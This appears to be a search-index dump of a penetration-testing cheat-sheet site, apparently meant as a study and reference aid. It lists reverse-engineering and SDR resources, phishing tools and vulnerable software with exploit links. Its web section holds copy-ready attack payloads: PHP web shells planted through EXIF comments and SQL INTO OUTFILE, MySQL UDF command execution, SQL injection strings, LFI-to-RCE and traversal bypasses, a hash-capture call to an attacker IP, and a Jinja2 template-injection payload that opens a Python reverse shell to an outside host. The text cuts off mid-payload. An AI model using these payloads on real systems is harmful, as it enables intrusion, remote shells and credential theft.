https://github.com/yellowbyte/analysis-of-anti-analysis/blob/master/research/the_return_of_disassembly_desynchronization/the_return_of_disassembly_desynchronization.md Control Flow Guard - Protects the execution flow from redirection - for example, from exploits that overwrite an address in the stack https://86hh.github.io/cfg.html","title":"Defense"},{"location":"reverse-engineering/#references","text":"Basic Reverse Engineering with Immunity Debugger: https://www.sans.org/reading-room/whitepapers/malicious/basic-reverse-engineering-immunity-debugger-36982 101 - https://www.youtube.com/watch?v=Min6DWTHDBw feature=em-uploademail Reverse Engineering for Beginners: https://www.begin.re/ Learning Radare2 by Reversing a UMPC Bios: https://stragedevices.blogspot.com/2019/02/finding-verified-intel-atom-msrs-in.html Survival guide for Radare2 with practice: https://github.com/ZigzagSecurity/survival-guide-radare2 http://www.capstone-engine.org/showcase.html Reverse engineering simple binaries created in Fortran, C, C++, Pascal and Ada: https://www.mkdynamics.net/current_projects/computer_security/Disassembling_binaries/disassembling_binaries.html Port-oriented Programming: https://twitter.com/bxl1989/status/1085101696735268865 OALabs - WinDbg Basics for Malware Analysis: https://www.youtube.com/watch?v=QuFJpH3My7A list=PLGf_j68jNtWG_6ZwFN4kx7jfKTQXoG_BN The 101 of ELF files on Linux: Understanding and Analysis: https://linux-audit.com/elf-binaries-on-linux-understanding-and-analysis/ Ground Zero: Reverse Engineering: https://scriptdotsh.com/index.php/category/reverse-engineering/ DEF CON 26 - Alexei Bulazel - Reverse Engineering Windows Defenders Emulator: https://www.youtube.com/watch?v=2NawGCUOYT4 David Litchfield, \u201cVariations in Exploit Methods Between Linux and Windows,\u201d 2003 - https://www.blackhat.com/presentations/bh-usa-03/bh-us-03-litchfield-paper.pdf - https://www.youtube.com/watch?v=VM1PzvChNv8 ARM SUE 2017 - Reverse Engineering Embedded ARM Devices - by pancake: https://www.youtube.com/watch?v=oXSx0Qo2Upk feature=youtu.be ARM ASSEMBLY BASICS CHEATSHEET: https://azeria-labs.com/assembly-basics-cheatsheet/ GO Set of IDA Pro scripts for parsing GoLang types information stored in compiled binary: https://github.com/sibears/IDAGolangHelper Java Toold, JADX, JD-GUI, Procyon, CFR, Fernflower etc., Bytecodeviewer, dex2jar, APK tool Mobile Apps Inro: https://medium.com/@xplodwild/turning-the-frustration-of-a-mobile-game-into-a-reverse-engineering-training-a9887043efdf They updated, we dumped memory: https://blog.usejournal.com/reverse-engineering-of-a-mobile-game-part-2-they-updated-we-dumped-memory-27046efdfb85 Now, it\u2019s obfuscated: https://medium.com/@xplodwild/reverse-engineering-of-a-mobile-game-part-3-now-its-obfuscated-9c31e29c386b","title":"References"},{"location":"rf-and-sdr/","text":"RF and SDR RFID / NFC Tools ESP-RFID-Tool: https://github.com/rfidtool/ESP-RFID-Tool https://www.aliexpress.com/item/ESP-RFID-Tool/32850151497.html References New References Practical_Guide_To_Hacking_RFID_NFC: https://smartlockpicking.com/slides/Confidence_A_2018_Practical_Guide_To_Hacking_RFID_NFC.pdf Intro to NFC Payment Relay Attacks: https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ Iceman is creating Proxmark3 / RFID / NFC Security related content: https://twitter.com/herrmann1001 https://www.patreon.com/iceman1001?utm_medium=social utm_source=twitter utm_campaign=creatorshare2 RaspberryPi Tools P4wnP1 - P4wnP1 A.L.O.A. by MaMe82 is a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into \"A Little Offensive Appliance\": https://github.com/mame82/P4wnP1_aloa - Plug Play USB device emulation - HIDScript - Bluetooth - WiFi - Networking - Configuration and Control via CLI , remotely if needed - Configuration and Control via web client - Automation RPI for TX https://github.com/F5OEO/rpitx https://www.rtl-sdr.com/using-an-rtl-sdr-and-rpitx-to-unlock-a-car-with-a-replay-attack/ SDR Tools urh - Universal Radio Hacker: investigate wireless protocols like a boss: https://github.com/jopohl/urh PDF Guide: https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf Video Guide: https://www.youtube.com/watch?v=kuubkTDAxwA index=1 list=PLlKjreY6G-1EKKBs9sucMdk8PwzcFuIPB Wiki: https://github.com/jopohl/urh/wiki - hardware interfaces for common Software Defined Radios - easy demodulation of signals - assigning participants to keep overview of your data - customizable decodings to crack even sophisticated encodings like CC1101 data whitening - assign labels to reveal the logic of the protocol - fuzzing component to find security leaks - modulation support to inject the data back into the system - simulation environment to perform stateful attacks rtl_433 - Program to decode traffic from Devices that are broadcasting on 433.9 MHz like temperature sensors: https://github.com/merbanan/rtl_433 Blog Posts: https://www.rtl-sdr.com/tag/rtl_433/ RPi and RRDTool: https://raspberrypiandstuff.wordpress.com/2017/08/04/rtl_433-on-a-raspberry-pi-made-bulletproof/ gqrx - Software defined radio receiver powered by GNU Radio and Qt: https://github.com/csete/gqrx IMSI-catcher - This program show you IMSI numbers of cellphones around you: https://github.com/Oros42/IMSI-catcher AirplaneJS - An SDR app written in JavaScript that picks up ADS-B radio signals from airplanes and plots them in real time on a map in your browser: https://github.com/watson/airplanejs srsLTE - srsLTE is a free and open-source LTE software suite developed by SRS: https://github.com/srsLTE/srsLTE QSpectrumAnalyzer - Spectrum analyzer for multiple SDR platforms (PyQtGraph based GUI for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends): https://github.com/xmikos/qspectrumanalyzer https://twitter.com/YashinMehaboobe/status/1092150871360712704 USB HID USB HID Security - script handling packets coming in from GNURadio via ZMQ and doing some decoding: https://github.com/miek/milight/blob/master/packet_handler.py https://twitter.com/assortedhackery/status/1076886102466801664 USB HID Keyboard: https://github.com/mame82/P4wnP1_aloa/blob/master/hid/keyboard_globals.go#L6 Logitech: https://twitter.com/mame82/status/1077191504412721152 Logitech Unifying After patches: https://twitter.com/mame82/status/1093859460102131717 https://threatpost.com/logitech-keystroke-injection-flaw/139928/ GreHack 2018: Trap Your Keyboard 101 - Marion Lafon: https://www.youtube.com/watch?v=bXMx6lt3Gz0 Resources LoRa Reverse Engineering and AES EM Side-Channel Attacks using SDR: https://archive.fosdem.org/2018/schedule/event/sdr_lora_aes/attachments/slides/2357/export/events/attachments/sdr_lora_aes/slides/2357/LoRa_AES_Security_SDR_FOSDEM_2018.pdf https://www.youtube.com/watch?v=Q-0u87eFAm8 TALKS FROM THE 2018 GNU RADIO CONFERENCE: https://www.rtl-sdr.com/talks-from-the-2018-gnu-radio-conference/ Picking a Needle in a Haystack: Detecting Drones via Network Traffic Analysis: https://arxiv.org/pdf/1901.03535.pdf Listening in to a DECT Digital Cordless Phone with a HackRF: https://www.rtl-sdr.com/listening-in-to-a-dect-digital-cordless-phone-with-a-hackrf/ Building a Carbon Fibre Dual Band Yagi Antenna for Amateur Radio Satellites with 3D Printed Parts for 20\u20ac: https://www.rtl-sdr.com/building-a-carbon-fibre-dual-band-yagi-antenna-for-amateur-radio-satellites-with-3d-printed-parts-for-20e/ Eavesdropping on DECT6.0 Cordless Phones with a HackRF and GR-DECT2: https://www.rtl-sdr.com/youtube-tutorial-eavesdropping-on-dect6-0-cordless-phones-with-a-hackrf-and-gr-dect2/ Implementing your own mobile phone: https://twitter.com/G33KatWork/status/1078580869844140032 Breaking LTE on Layer Two: https://alter-attack.net/ PCILeech uses PCIe hardware devices to read and write from the target system memory: https://github.com/ufrisk/pcileech","title":"RF and SDR"},{"location":"rf-and-sdr/#rf-and-sdr","text":"","title":"RF and SDR"},{"location":"rf-and-sdr/#rfid-nfc","text":"Tools ESP-RFID-Tool: https://github.com/rfidtool/ESP-RFID-Tool https://www.aliexpress.com/item/ESP-RFID-Tool/32850151497.html References New References Practical_Guide_To_Hacking_RFID_NFC: https://smartlockpicking.com/slides/Confidence_A_2018_Practical_Guide_To_Hacking_RFID_NFC.pdf Intro to NFC Payment Relay Attacks: https://salmg.net/2018/12/01/intro-to-nfc-payment-relay-attacks/ NFC Payments: Relay Attacks with LoRa: https://salmg.net/2019/01/12/nfc-payment-relay-attacks-with-lora/ Iceman is creating Proxmark3 / RFID / NFC Security related content: https://twitter.com/herrmann1001 https://www.patreon.com/iceman1001?utm_medium=social utm_source=twitter utm_campaign=creatorshare2","title":"RFID / NFC"},{"location":"rf-and-sdr/#raspberrypi","text":"Tools P4wnP1 - P4wnP1 A.L.O.A. by MaMe82 is a framework which turns a Rapsberry Pi Zero W into a flexible, low-cost platform for pentesting, red teaming and physical engagements ... or into \"A Little Offensive Appliance\": https://github.com/mame82/P4wnP1_aloa - Plug Play USB device emulation - HIDScript - Bluetooth - WiFi - Networking - Configuration and Control via CLI , remotely if needed - Configuration and Control via web client - Automation RPI for TX https://github.com/F5OEO/rpitx https://www.rtl-sdr.com/using-an-rtl-sdr-and-rpitx-to-unlock-a-car-with-a-replay-attack/","title":"RaspberryPi"},{"location":"rf-and-sdr/#sdr","text":"Tools urh - Universal Radio Hacker: investigate wireless protocols like a boss: https://github.com/jopohl/urh PDF Guide: https://github.com/jopohl/urh/releases/download/v2.0.0/userguide.pdf Video Guide: https://www.youtube.com/watch?v=kuubkTDAxwA index=1 list=PLlKjreY6G-1EKKBs9sucMdk8PwzcFuIPB Wiki: https://github.com/jopohl/urh/wiki - hardware interfaces for common Software Defined Radios - easy demodulation of signals - assigning participants to keep overview of your data - customizable decodings to crack even sophisticated encodings like CC1101 data whitening - assign labels to reveal the logic of the protocol - fuzzing component to find security leaks - modulation support to inject the data back into the system - simulation environment to perform stateful attacks rtl_433 - Program to decode traffic from Devices that are broadcasting on 433.9 MHz like temperature sensors: https://github.com/merbanan/rtl_433 Blog Posts: https://www.rtl-sdr.com/tag/rtl_433/ RPi and RRDTool: https://raspberrypiandstuff.wordpress.com/2017/08/04/rtl_433-on-a-raspberry-pi-made-bulletproof/ gqrx - Software defined radio receiver powered by GNU Radio and Qt: https://github.com/csete/gqrx IMSI-catcher - This program show you IMSI numbers of cellphones around you: https://github.com/Oros42/IMSI-catcher AirplaneJS - An SDR app written in JavaScript that picks up ADS-B radio signals from airplanes and plots them in real time on a map in your browser: https://github.com/watson/airplanejs srsLTE - srsLTE is a free and open-source LTE software suite developed by SRS: https://github.com/srsLTE/srsLTE QSpectrumAnalyzer - Spectrum analyzer for multiple SDR platforms (PyQtGraph based GUI for soapy_power, hackrf_sweep, rtl_power, rx_power and other backends): https://github.com/xmikos/qspectrumanalyzer https://twitter.com/YashinMehaboobe/status/1092150871360712704 USB HID USB HID Security - script handling packets coming in from GNURadio via ZMQ and doing some decoding: https://github.com/miek/milight/blob/master/packet_handler.py https://twitter.com/assortedhackery/status/1076886102466801664 USB HID Keyboard: https://github.com/mame82/P4wnP1_aloa/blob/master/hid/keyboard_globals.go#L6 Logitech: https://twitter.com/mame82/status/1077191504412721152 Logitech Unifying After patches: https://twitter.com/mame82/status/1093859460102131717 https://threatpost.com/logitech-keystroke-injection-flaw/139928/ GreHack 2018: Trap Your Keyboard 101 - Marion Lafon: https://www.youtube.com/watch?v=bXMx6lt3Gz0 Resources LoRa Reverse Engineering and AES EM Side-Channel Attacks using SDR: https://archive.fosdem.org/2018/schedule/event/sdr_lora_aes/attachments/slides/2357/export/events/attachments/sdr_lora_aes/slides/2357/LoRa_AES_Security_SDR_FOSDEM_2018.pdf https://www.youtube.com/watch?v=Q-0u87eFAm8 TALKS FROM THE 2018 GNU RADIO CONFERENCE: https://www.rtl-sdr.com/talks-from-the-2018-gnu-radio-conference/ Picking a Needle in a Haystack: Detecting Drones via Network Traffic Analysis: https://arxiv.org/pdf/1901.03535.pdf Listening in to a DECT Digital Cordless Phone with a HackRF: https://www.rtl-sdr.com/listening-in-to-a-dect-digital-cordless-phone-with-a-hackrf/ Building a Carbon Fibre Dual Band Yagi Antenna for Amateur Radio Satellites with 3D Printed Parts for 20\u20ac: https://www.rtl-sdr.com/building-a-carbon-fibre-dual-band-yagi-antenna-for-amateur-radio-satellites-with-3d-printed-parts-for-20e/ Eavesdropping on DECT6.0 Cordless Phones with a HackRF and GR-DECT2: https://www.rtl-sdr.com/youtube-tutorial-eavesdropping-on-dect6-0-cordless-phones-with-a-hackrf-and-gr-dect2/ Implementing your own mobile phone: https://twitter.com/G33KatWork/status/1078580869844140032 Breaking LTE on Layer Two: https://alter-attack.net/ PCILeech uses PCIe hardware devices to read and write from the target system memory: https://github.com/ufrisk/pcileech","title":"SDR"},{"location":"social-engineering/","text":"Tools The most complete Phishing Tool, with 32 templates +1 customizable: https://github.com/thelinuxchoice/blackeye Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication: https://github.com/kgretzky/evilginx2 Bypassing LastPass\u2019s \u201cAdvanced\u201d YubiKey MFA: A MITM Phishing Attack: https://pberba.github.io/security/2020/05/28/lastpass-phishing/","title":"Social engineering"},{"location":"social-engineering/#tools","text":"The most complete Phishing Tool, with 32 templates +1 customizable: https://github.com/thelinuxchoice/blackeye Standalone man-in-the-middle attack framework used for phishing login credentials along with session cookies, allowing for the bypass of 2-factor authentication: https://github.com/kgretzky/evilginx2 Bypassing LastPass\u2019s \u201cAdvanced\u201d YubiKey MFA: A MITM Phishing Attack: https://pberba.github.io/security/2020/05/28/lastpass-phishing/","title":"Tools"},{"location":"steganography/","text":"Images StegHide Extract: steghide extract - p password - sf input . jpg steghide info image . jpg Identify: strings on file should show: 56789 : CDEFGHIJSTUVWXYZcdefghijstuvwxyz Audio Sonic Visualiser\u200b - viewing and analysing the contents of music audio files: https://www.sonicvisualiser.org/","title":"Steganography"},{"location":"steganography/#images","text":"StegHide Extract: steghide extract - p password - sf input . jpg steghide info image . jpg Identify: strings on file should show: 56789 : CDEFGHIJSTUVWXYZcdefghijstuvwxyz","title":"Images"},{"location":"steganography/#audio","text":"Sonic Visualiser\u200b - viewing and analysing the contents of music audio files: https://www.sonicvisualiser.org/","title":"Audio"},{"location":"vulnerable/","text":"Desktop Applications Chkrootkit 0.49 Prev Esc https://www.exploit-db.com/exploits/33899 Mozilla Firefox 45.0 RCE https://www.exploit-db.com/exploits/42484 Zervit 0.4 Acrobat Reader version 8.1.2 \u2013 ftp://ftp.adobe.com/pub/adobe/reader/win/8.x/8.1.2/enu/AdbeRdr812_en_US.exe Java 7 Update 6 JRE \u2013 http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html Winamp 5.5 \u2013 http://www.filehorse.com/download-winamp/4137/download/ Server Applications HttpFileServer 2.3x before 2.3c CVE-2014-6287 RCE https://www.exploit-db.com/exploits/39161 exploit / windows / http / rejetto_hfs_exec AChat 0.150 beta7 Buffer Overflow https://www.exploit-db.com/exploits/36025 exploit / windows / misc / achat_bof Apache James 2.3.2 RCE https://www.exploit-db.com/exploits/35513/ htb_solidstate Elastix 2.2.0 LFI https://www.exploit-db.com/exploits/37637 ColdFusion 8.0.1 CVE-2009-2265 File upload https://arrexel.com/coldfusion-8-0-1-arbitrary-file-upload/ exploit / windows / http / coldfusion_fckeditor Xdebug RCE https://github.com/gteissier/xdebug-shell https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce IRCD 3.2.8.1 CVE-2010-2075 RCE https://www.exploit-db.com/exploits/13853 exploit / unix / irc / unreal_ircd_3281_backdoor Haraka SMTP 2.8.9 RCE https://www.exploit-db.com/exploits/41162 Zabbix 2.2 3.0.3 RCE https://www.exploit-db.com/exploits/39937 CouchDB 2.1.0 CVE-2017-12636 RCE https://www.exploit-db.com/exploits/44913/ https://justi.cz/security/2017/11/14/couchdb-rce-npm.html PlaySMS 1.4 RCE https://www.exploit-db.com/exploits/42044 ImageMagick 6.9.3-9 CVE-2016\u20133714 RCE dompdf 0.6.0 LFI https://www.exploit-db.com/exploits/33004/ vsftpd 2.3.4 Shell / RCE / Backdoor https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py exploit / unix / ftp / vsftpd_234_backdoor SLMail WarFTP 1.65 XAMPP 1.7.2 \u2013 https://www.exploit-db.com/exploits/10391/ 3Com TFTP 2.0.1 Web Applications Pfsense = 2.2.6 Command Injection https://www.exploit-db.com/exploits/39709/ Drupal 7.x RCE https://www.exploit-db.com/exploits/41564 October CMS 1.0.412 RCE, PHP object injection https://www.exploit-db.com/exploits/41936 NibbleBlog Usernames: /nibbleblog/content/private/users.xml Apache Struts 2.3.x before 2.3.32 2.5.x before 2.5.10.1 RCE CVE-2017-5638 https://github.com/mazen160/struts-pwn PHPLiteAdmin 1.9.2 RCE https://www.exploit-db.com/exploits/24044 PiHole sudo pihole - a - p PASSWORD UnrealIRCD 3.2.8.1 Backdoor RCE https://www.exploit-db.com/exploits/16922 HelpDeskZ RCE https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/helpdeskz-file-enum.md Pfsense Pfsense 2.1.4 Command Injection https://www.exploit-db.com/exploits/43560 [PfSense Vulnerabilities Part 2: Command Injection - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/ [PfSense Vulnerabilities Part 3: Local File Inclusion - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-3-local-file-inclusion/ [PfSense Vulnerabilities Part 4: Directory Traversal - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-4-directory-traversal/ Magento ExploitDB: 37977 (change password), 37811 https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper http://www.ethanjoachimeldridge.info/tech-blog/exploiting-magento https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html Plugins to exploit: https://pluginarchive.com/magento/magpleasure_filesystem https://github.com/lavalamp-/LavaMagentoBD","title":"Vulnerable"},{"location":"vulnerable/#desktop-applications","text":"Chkrootkit 0.49 Prev Esc https://www.exploit-db.com/exploits/33899 Mozilla Firefox 45.0 RCE https://www.exploit-db.com/exploits/42484 Zervit 0.4 Acrobat Reader version 8.1.2 \u2013 ftp://ftp.adobe.com/pub/adobe/reader/win/8.x/8.1.2/enu/AdbeRdr812_en_US.exe Java 7 Update 6 JRE \u2013 http://www.oracle.com/technetwork/java/javase/downloads/java-archive-downloads-javase7-521261.html Winamp 5.5 \u2013 http://www.filehorse.com/download-winamp/4137/download/","title":"Desktop Applications"},{"location":"vulnerable/#server-applications","text":"HttpFileServer 2.3x before 2.3c CVE-2014-6287 RCE https://www.exploit-db.com/exploits/39161 exploit / windows / http / rejetto_hfs_exec AChat 0.150 beta7 Buffer Overflow https://www.exploit-db.com/exploits/36025 exploit / windows / misc / achat_bof Apache James 2.3.2 RCE https://www.exploit-db.com/exploits/35513/ htb_solidstate Elastix 2.2.0 LFI https://www.exploit-db.com/exploits/37637 ColdFusion 8.0.1 CVE-2009-2265 File upload https://arrexel.com/coldfusion-8-0-1-arbitrary-file-upload/ exploit / windows / http / coldfusion_fckeditor Xdebug RCE https://github.com/gteissier/xdebug-shell https://github.com/vulhub/vulhub/tree/master/php/xdebug-rce IRCD 3.2.8.1 CVE-2010-2075 RCE https://www.exploit-db.com/exploits/13853 exploit / unix / irc / unreal_ircd_3281_backdoor Haraka SMTP 2.8.9 RCE https://www.exploit-db.com/exploits/41162 Zabbix 2.2 3.0.3 RCE https://www.exploit-db.com/exploits/39937 CouchDB 2.1.0 CVE-2017-12636 RCE https://www.exploit-db.com/exploits/44913/ https://justi.cz/security/2017/11/14/couchdb-rce-npm.html PlaySMS 1.4 RCE https://www.exploit-db.com/exploits/42044 ImageMagick 6.9.3-9 CVE-2016\u20133714 RCE dompdf 0.6.0 LFI https://www.exploit-db.com/exploits/33004/ vsftpd 2.3.4 Shell / RCE / Backdoor https://github.com/In2econd/vsftpd-2.3.4-exploit/blob/master/vsftpd_234_exploit.py exploit / unix / ftp / vsftpd_234_backdoor SLMail WarFTP 1.65 XAMPP 1.7.2 \u2013 https://www.exploit-db.com/exploits/10391/ 3Com TFTP 2.0.1","title":"Server Applications"},{"location":"vulnerable/#web-applications","text":"Pfsense = 2.2.6 Command Injection https://www.exploit-db.com/exploits/39709/ Drupal 7.x RCE https://www.exploit-db.com/exploits/41564 October CMS 1.0.412 RCE, PHP object injection https://www.exploit-db.com/exploits/41936 NibbleBlog Usernames: /nibbleblog/content/private/users.xml Apache Struts 2.3.x before 2.3.32 2.5.x before 2.5.10.1 RCE CVE-2017-5638 https://github.com/mazen160/struts-pwn PHPLiteAdmin 1.9.2 RCE https://www.exploit-db.com/exploits/24044 PiHole sudo pihole - a - p PASSWORD UnrealIRCD 3.2.8.1 Backdoor RCE https://www.exploit-db.com/exploits/16922 HelpDeskZ RCE https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/Web/helpdeskz-file-enum.md","title":"Web Applications"},{"location":"vulnerable/#pfsense","text":"Pfsense 2.1.4 Command Injection https://www.exploit-db.com/exploits/43560 [PfSense Vulnerabilities Part 2: Command Injection - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-2-command-injection/ [PfSense Vulnerabilities Part 3: Local File Inclusion - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-3-local-file-inclusion/ [PfSense Vulnerabilities Part 4: Directory Traversal - https://www.proteansec.com/linux/pfsense-vulnerabilities-part-4-directory-traversal/","title":"Pfsense"},{"location":"vulnerable/#magento","text":"ExploitDB: 37977 (change password), 37811 https://dustri.org/b/writing-a-simple-extensionbackdoor-for-magento.html https://www.foregenix.com/blog/anatomy-of-a-magento-attack-froghopper http://www.ethanjoachimeldridge.info/tech-blog/exploiting-magento https://0xdf.gitlab.io/2019/09/28/htb-swagshop.html Plugins to exploit: https://pluginarchive.com/magento/magpleasure_filesystem https://github.com/lavalamp-/LavaMagentoBD","title":"Magento"},{"location":"web/","text":"Vulnerabilities Command Injection Bypass w \\ h \\ o \\ a \\ m \\ i \\ w \\ h \\ o \\ a \\ m \\ i html , htm , js , jsb , mhtml , mht , ** php , phtml , php3 , php4 , php5 , phps , ** shtml , jhtml , pl , py , cgi , sh , ksh , bsh , c , htaccess , htpasswd , exe , scr , dll , msi , vbs , bat , com , pif , cmd , vxd , cpl , empty Tools Commix - https://github.com/commixproject/commix Usage examples: https://github.com/commixproject/commix/wiki/Usage-Examples CRLF https://speakerdeck.com/shikarisenpai/crlf-and-openredirect-for-dummies?slide=28 Tools CRLF-Injection-Scanner: https://github.com/MichaelStott/CRLF-Injection-Scanner/blob/master/crlf_scan.py CRLF - Auto CRLF Injector: https://github.com/rudSarkar/crlf-injector Payloads https://github.com/cujanovic/CRLF-Injection-Payloads/blob/master/CRLF-payloads.txt https://github.com/mubix/tools/blob/master/fuzzdb/attack-payloads/http-protocol/crlf-injection.fuzz.txt CSRF Methodology: https://twitter.com/Alra3ees/status/1076021203117195265 CSRF Cheatsheet: https://trustfoundry.net/cross-site-request-forgery-cheat-sheet/ Tools XSRFProbe: https://github.com/0xInfection/XSRFProbe File Upload Bypass Null Byte: %00 to bypass file name restrictions ( wpes . php % 00 . png ) Suffix file name with % ( example . php % ) Double Extensions: wpes . png . php valid . txt . php Altering content type Magic number: (Example: gif: GIF89a ; ) Put GIF89a ; \u200b as the first line in the file and save the file with a \u200b .gif \u200b extension https://blog.netspi.com/magic-bytes-identifying-common-file-formats-at-a-glance/ Code in image comment: exiftool - Comment = ?php echo pre ; system ( $_GET [ cmd ]); ? lo . jpg Alternative Extensions PHP - pht, phpt, phtml, php3, php4, php5, php6, php7 CFM - cfml, cfc, dbm ASP - aspx Perl - pl, pm, cgi, lib JSP - jspx, jsw, jsv, jspf Open Redirect Scenarios Grab tokens via mis-configured apps/login flows Bypassing blacklists for SSRF/RCE XSS via \"location.href = 'javascript:alert(0)1'\" Taking advantage of fileuploads and mobile devices Bypasses https % 3 A % 2 F % 2 Fmysite . com % 2 F https % 3 A % 2 F % 2 Fexample . com % 2 F % 3 Freturnurl % 3 D % 2 F % 2 Fmysite . com % 2 F \\ / yoururl . com \\ / \\ / yoururl . com \\\\ yoururl . com // yoururl . com // theirsite @ yoursite . com https : // yoursite ? c = . theirsite . com / https : // yoursite . com #. theirsite . com / https : // yoursite . com \\. thersite . com / //% 2 F / yoursite . com //// yoursite . com https : // theirsite . computer / - ( if they just check for * theirsite . com * , . computer is a valid tld ! https : // theirsite . com . mysite . com - ( Treat their domain as subdomain to yours ) /% 0 D / yoursite . com - ( Also try % 09 , % 00 , % 0 a , % 07 ) java % 0 d % 0 ascript % 0 d % 0 a : alert ( 0 ) , j % 0 d % 0 aava % 0 d % 0 aas % 0 d % 0 acrip % 0 d % 0 at % 0 d % 0 a : confirm ` 0 ` , java % 07 script : prompt ` 0 ` , java % 09 scrip % 07 t : prompt ` 0 ` https://www.bugbountynotes.com/training/tutorial?id=1 SSRF SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-1: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-2: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-2-a085ec4332c0 SSRF - Server Side Request Forgery (Types and ways to exploit it) Part-3: https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-3-b0f5997e3739 Tools https://github.com/swisskyrepo/SSRFmap SQL Injection https://www.websec.ca/kb/sql_injection#Extra_About https://docs.google.com/document/d/1z2ozmSfUtT_3RBUM_1FFpTEYj7yKoGBpPlASz_iShsg/edit https://www.netsparker.com/blog/web-security/sql-injection-cheat-sheet/ Tools SqlMap: sqlmap - r sqlmap . req --level=5 --risk=3 --dump-all\u200b AutoSQLi: https://github.com/jesuiscamille/AutoSQLi SQLiDumper: https://www.cybrary.it/0p3n/pentesting-sqli-dumper-v8-tool/ Automatic SQL injection with Charles and sqlmap api http://0r1.me/SQLiScanner/ https://github.com/0xbug/SQLiScanner Payload Combines blind command injection and blind sql injection (mysql) in one payload (works with no quotes/single quotes and double quotes): https://mobile.twitter.com/bl4ckh4ck5/status/1100167033407320065 /*$(sleep 5)`sleep 5``*/ sleep ( 5 ) # /*$(sleep 5)`sleep 5` #*/||sleep(5)|| ||sleep(5)|| ` WebShell over MySQL: SELECT ?php echo shell_exec ( $_GET [ c ]); ? INTO OUTFILE /var/www/html/example.php User Defined Functions (UDF) (sqlmap/udf/mysql) SELECT @@ plugin_dir ; PowerShell$ Convert - Dll - DllPath lib_mysqludf_sys . dll - OutputPath bytes . txt SELECT CHAR ( 64 , 64 ,....) INTO OUTFILE @@plugin_dir /lib_mysqludf_sys.dll FIELDS ESCAPED BY ; CREATE FUNCTION sys_eval RETURNS STRING SONAME lib_mysqludf_sys.dll ; SELECT sys_eval ( whoami ); Simple payloads: or 1=1 LIMIT 1 -- or 1 = 1 LIMIT 1 -- - or 1=1 LIMIT 1# or 1 # or 1=1 -- or 1 = 1 -- - Order by to get column count: 1337 order by N Read file: LOAD_FILE ( /etc/passwd ) Read from information schema: union select 1 , 2 , group_concat ( distinct table_schema separator , ) from information_schema . tables LIMIT 1 , 1 union select 1 , 2 , group_concat ( distinct table_name separator , ) from information_schema . tables where table_schema = security LIMIT 1 , 1 Write to file: select 1 , 2 , 3 , 4 , ?php echo system ( $_GET [ cmd ]); ? , 6 INTO OUTFILE C:\\htdocs\\webroot\\shell.php SQL Server Run Responder and do following to capture hashes: EXEC ( master .. xp_dirtree ( \\\\ (ATTACKER IP ADDRESS)\\foo ) -- Add a trigger to do a malicious action (price 0) Language Specific PHP Good example from DOCs, where parameterization is not used: http://php.net/manual/en/mysqli.examples-basic.php (use: https://phptherightway.com/ ) Practice https://github.com/Audi-1/sqli-labs LFI / RFI Universal LFI for Windows + PHP (using phpinfo): https://rdot.org/forum/showthread.php?t=1134 PHP LFI to arbitrary code execution via rfc1867 file upload temporary files Payloads including uploaded files include data:// or php://input, php://filter pseudo protocol including logs including /proc/self/environ include session files - (usually names /tmp/sess_SESSIONID) include other files created by PHP application C :\\ Windows \\ Temp \\ php 16 - bit - random . TMP without bruteforce can do inc = C : \\ Windows \\ Temp \\ php LFI to RCE RCE with TXT upload Expose .txt file and use a vulnerable include to include the txt file into code (evil.txt.php). PHP config can be used to disable URL file access. But still local files can be accessed (allow_url_fopen / allow_url_include) RCE with Logs Use NC to write logs with malicious content to access_logs. Connect and just send the attack string (In user-agent etc.). Then include the log file (local file inclusion) RCE over SQLi Return ?php echo \"test\"? from SQL and see results to check if RCE is possible over SQLi PHP Wrappers File upload with POST data curl - s -- data ? system ( ls -la ); ? http://target.host/web.php?file_path=php://input%00 Base64 encode the LFI http : // X . X . X . X /? page = php : // filter / convert . base64 - encode / resource = ( PHP FILE NAME NO EXTENSION ) Path Traversal Payloads .. / .. \\ .. \\ / % 2 e % 2 e % 2f % 252 e % 252 e % 252f %c0%ae%c0%ae%c0%af %uff0e%uff0e%u2215 %uff0e%uff0e%u2216 ... / . / ... \\ . \\ Server Side Template Injection (SSTI) https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection Introduction and Bypasses: https://bowneconsultingcontent.com/pub/EH/proj/ED105.htm https://portswigger.net/research/server-side-template-injection Diff Template related: Server-Side Template Injection: RCE for the modern webapp: https://www.blackhat.com/docs/us-15/materials/us-15-Kettle-Server-Side-Template-Injection-RCE-For-The-Modern-Web-App-wp.pdf Payloads: Jinja2 { % for x in (). __class__ . __base__ . __subclasses__ () % }{ % if warning in x . __name__ % }{{ x (). _module . __builtins__ [ __import__ ]}}{ % endif % }{ % endfor % } { % for x in (). __class__ . __base__ . __subclasses__ () % }{ % if warning in x . __name__ % }{{ x (). _module . __builtins__ [ __import__ ]( os ). popen ( python3 -c import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\\ 1 92.90.172.2\\ ,4444));os.dup2(s.fileno(),0); 